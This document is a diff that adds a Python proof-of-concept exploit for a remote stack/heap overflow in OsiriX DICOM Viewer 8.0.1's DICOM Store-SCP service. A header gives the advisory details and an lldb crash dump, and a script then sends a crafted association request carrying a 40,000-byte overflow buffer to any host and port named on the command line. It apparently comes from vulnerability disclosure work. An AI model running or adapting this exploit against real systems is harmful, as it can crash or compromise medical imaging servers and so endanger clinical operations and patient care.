@@ -1,0 +1,130 @@
+#!/usr/bin/env python
+# -*- coding: utf8 -*-
+#
+#
+# OsiriX DICOM Viewer 8.0.1 (dulparse.cc) Remote Memory Corruption Vulnerability
+#
+#
+# Vendor: Pixmeo Sarl
+# Product web page: http://www.osirix-viewer.com
+# Affected version: OsiriX 8.0.1
+#
+# Summary: With high performance and an intuitive interactive user interface, OsiriX MD is
+# the most widely used DICOM viewer in the world. It is the result of more than 10 years of
+# research and development in digital imaging. It fully supports the DICOM standard for an
+# easy integration in your workflow environment and an open platform for development of
+# processing tools. It offers advanced post-processing techniques in 2D and 3D, exclusive
+# innovative technique for 3D and 4D navigation and a complete integration with any PACS.
+# OsiriX MD supports 64-bit computing and multithreading for the best performances on the
+# most modern processors. OsiriX MD is certified for medical use, FDA cleared and CE II labeled.
+#
+# Summary2: OsiriX is an image processing application for Mac dedicated to DICOM images
+# (".dcm" / ".DCM" extension) produced by equipment (MRI, CT, PET, PET-CT, ...).
+# Osirix is complementary to existing viewers, in particular to nuclear medicine viewers.
+#
+# Desc: The vulnerability is caused due to the usage of vulnerable collection of libraries that
+# are part of DCMTK Toolkit, specifically the parser for the DICOM Upper Layer Protocol or DUL.
+# Stack/Heap Buffer overflow/underflow can be triggered when sending and processing wrong length
+# of ACSE data structure received over the network by the DICOM Store-SCP service. An attacker can
+# overflow the stack and the heap of the process when sending large array of bytes to the presentation
+# context item length segment of the DICOM standard, potentially resulting in remote code execution
+# and/or denial of service scenario.
+#
+# -------------------------------------------------------------------------------------
+#
+# (lldb)  
+# Process 65202 stopped
+# * thread #20: tid = 0x2c5fcc, 0x0000000108978441 OsiriX Lite`parseAssociate(unsigned char*, unsigned int, dul_associatepdu*) + 833, name = 'DICOM Store-SCP', stop reason = EXC_BAD_ACCESS (code=1, address=0x7fb5af00fda1)
+#     frame #0: 0x0000000108978441 OsiriX Lite`parseAssociate(unsigned char*, unsigned int, dul_associatepdu*) + 833
+# OsiriX Lite`parseAssociate:
+# ->  0x108978441 <+833>: movzbl (%r10), %eax
+#     0x108978445 <+837>: cmpl   $0x40, %eax
+#     0x108978448 <+840>: movq   -0x200(%rbp), %rcx
+#     0x10897844f <+847>: je     0x108978513               ; <+1043>
+# (lldb) bt
+# * thread #19: tid = 0x2f6189, 0x0000000102fe8441 OsiriX Lite`parseAssociate(unsigned char*, unsigned int, dul_associatepdu*) + 833, name = 'DICOM Store-SCP', stop reason = EXC_BAD_ACCESS (code=1, address=0x7fab8ac000a1)
+#   * frame #0: 0x0000000102fe8441 OsiriX Lite`parseAssociate(unsigned char*, unsigned int, dul_associatepdu*) + 833
+#     frame #1: 0x0000000102fe4363 OsiriX Lite`AE_6_ExamineAssociateRequest(PRIVATE_NETWORKKEY**, PRIVATE_ASSOCIATIONKEY**, int, void*) + 339
+#     frame #2: 0x0000000102fe14ca OsiriX Lite`PRV_StateMachine(PRIVATE_NETWORKKEY**, PRIVATE_ASSOCIATIONKEY**, int, int, void*) + 314
+#     frame #3: 0x0000000102fdae9c OsiriX Lite`DUL_ReceiveAssociationRQ(void**, DUL_BLOCKOPTIONS, int, DUL_ASSOCIATESERVICEPARAMETERS*, void**, int) + 4348
+#     frame #4: 0x0000000102facf1e OsiriX Lite`ASC_receiveAssociation(T_ASC_Network*, T_ASC_Association**, long, void**, unsigned int*, bool, DUL_BLOCKOPTIONS, int) + 462
+#     frame #5: 0x0000000102c5f28f OsiriX Lite`DcmQueryRetrieveSCP::waitForAssociation(T_ASC_Network*) + 207
+#     frame #6: 0x0000000102c3f9c7 OsiriX Lite`-[DCMTKQueryRetrieveSCP run] + 4999
+#     frame #7: 0x0000000102987a37 OsiriX Lite`-[AppController startSTORESCP:] + 519
+#     frame #8: 0x00007fff975b030d Foundation`__NSThread__start__ + 1243
+#     frame #9: 0x00007fffab021aab libsystem_pthread.dylib`_pthread_body + 180
+#     frame #10: 0x00007fffab0219f7 libsystem_pthread.dylib`_pthread_start + 286
+#     frame #11: 0x00007fffab021221 libsystem_pthread.dylib`thread_start + 13
+# (lldb) register read
+# General Purpose Registers:
+#        rax = 0x0000000000000103
+#        rbx = 0x00000001044c18d8  OsiriX Lite`ECC_Normal
+#        rcx = 0x00006100002e6200
+#        rdx = 0x000000000001ad41
+#        rdi = 0x00000001044c18d8  OsiriX Lite`ECC_Normal
+#        rsi = 0x00006100002e6200
+#        rbp = 0x0000700005a4a670
+#        rsp = 0x0000700005a4a420
+#         r8 = 0x0000000000000103
+#         r9 = 0x00000000fb40cfc6
+#        r10 = 0x00007fab8ac000a1
+#        r11 = 0x0000000000000041
+#        r12 = 0x0000700005a4a6b8
+#        r13 = 0x00000001044c18f0  OsiriX Lite`EC_Normal
+#        r14 = 0x00000001044c18d8  OsiriX Lite`ECC_Normal
+#        r15 = 0x0000000000008014
+#        rip = 0x0000000102fe8441  OsiriX Lite`parseAssociate(unsigned char*, unsigned int, dul_associatepdu*) + 833
+#     rflags = 0x0000000000010286
+#         cs = 0x000000000000002b
+#         fs = 0x0000000000000000
+#         gs = 0x0000000000000000
+#
+# -------------------------------------------------------------------------------------
+#
+# Tested on: OS X 10.12.2 (Sierra)
+#            OS X 10.12.1 (Sierra)
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2016-5382
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5382.php
+#
+# https://tools.ietf.org/html/rfc3240
+# https://github.com/commontk/DCMTK/commit/1b6bb76
+#
+# 29.11.2016
+#
+
+
+import sys, socket
+
+hello = ('\x01\x00\x00\x00\x80\x71\x00\x01\x00\x00\x4f\x52\x54\x48'
+         '\x41\x4e\x43\x20\x20\x20\x20\x20\x20\x20\x20\x20\x4a\x4f'
+         '\x58\x59\x50\x4f\x58\x59\x21\x00\x00\x00\x00\x00\x00\x00'
+         '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+         '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+         '\x00\x00\x00\x00\x10\x00\x00\x15\x31\x2e\x32\x2e\x38\x34'
+         '\x30\x2e\x31\x30\x30\x30\x38\x2e\x33\x2e\x31\x2e\x31\x2e'
+         '\x31\x20\x00\x80\x00')
+
+bye = ('\x50\x00\x00\x0c\x51\x00\x00\x04\x00\x00\x07\xde'
+       '\x52\x00\x00\x00')
+
+buffer = '\x41\x42\x43\x44' * 10000
+
+if len(sys.argv) < 3:
+  print '\nUsage: ' +sys.argv[0]+ ' <target> <port>'
+  print 'Example: ' +sys.argv[0]+ ' 172.19.0.214 11112\n'
+  sys.exit(0)
+ 
+host = sys.argv[1]
+port = int(sys.argv[2])
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect((host, port))
+s.settimeout(251)
+s.send(hello+buffer+bye)
+s.close
